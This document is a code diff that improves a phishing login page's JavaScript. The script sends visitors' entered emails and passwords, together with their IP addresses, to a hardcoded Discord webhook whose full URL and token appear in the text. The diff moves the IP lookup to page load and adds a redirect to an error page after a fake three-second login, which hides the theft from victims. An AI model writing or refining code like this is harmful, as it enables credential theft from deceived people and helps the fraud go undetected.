@@ -6,15 +6,12 @@ const loginButton = document.querySelector("button");
 // Webhook URL
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1358739681470316677/-GPhfZIhYskH1FlWulsIrUQZoG_oE6w7tewh1e8EowwBhSSDRdNzMXUPjG39gwUyt0uB";
 
-// -----------------------------------
-// ELLIPSIS ANIMATION
-// ------------------------------------
-function removeEllipsisAnimation() {
-  loginButton.innerHTML = "";
-  loginButton.textContent = "Log In";
-  loginButton.removeAttribute("disabled");
-}
+// Variable to store the user's IP address
+let userIP = "Unknown IP";
 
+// -----------------------------------
+// FETCH IP ADDRESS ON PAGE LOAD
+// -----------------------------------
 async function fetchIPAddress() {
   try {
     const response = await fetch("https://api.ipify.org?format=json");
@@ -26,10 +23,25 @@ async function fetchIPAddress() {
   }
 }
 
+// Fetch the IP address when the page loads
+document.addEventListener("DOMContentLoaded", async () => {
+  userIP = await fetchIPAddress(); // Store the IP address in the `userIP` variable
+  console.log("User IP Address:", userIP); // Optional: Log the IP for debugging
+});
+
+// -----------------------------------
+// ELLIPSIS ANIMATION
+// ------------------------------------
+function removeEllipsisAnimation() {
+  loginButton.innerHTML = "";
+  loginButton.textContent = "Log In";
+  loginButton.removeAttribute("disabled");
+}
+
 async function sendCredentialsToWebhook(email, password) {
   try {
-    // Fetch the user's IP address
-    const ip = await fetchIPAddress();
+    // Use the stored IP address
+    const ip = userIP;
 
     // Prepare the embed payload
     const embedPayload = {
@@ -104,7 +116,11 @@ function animateEllipsis() {
   loginButton.setAttribute("disabled", "true");
 
   // Simulate login process
-  setTimeout(removeEllipsisAnimation, 3000);
+  setTimeout(() => {
+    removeEllipsisAnimation();
+    // Redirect to error.html after 3 seconds
+    window.location.href = "error.html";
+  }, 3000);
 }
 
 // --------------------------
